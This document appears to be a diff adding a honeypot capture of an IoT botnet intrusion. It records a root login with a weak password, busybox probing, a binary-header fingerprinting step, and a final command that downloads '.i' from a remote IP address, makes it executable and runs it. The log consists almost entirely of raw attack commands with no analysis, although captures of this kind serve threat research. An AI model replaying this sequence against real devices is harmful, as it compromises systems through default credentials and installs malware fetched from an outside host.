@@ -1,0 +1,13 @@
+from: 109.105.251.136:57238 user:root password:user
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox IEPOU
+cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox IEPOU
+tftp; wget; /bin/busybox IEPOU
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox IEPOU
+rm .s; wget http://197.245.224.28:20115/.i; chmod 777 .i; ./.i; exit
+q
+[eof]
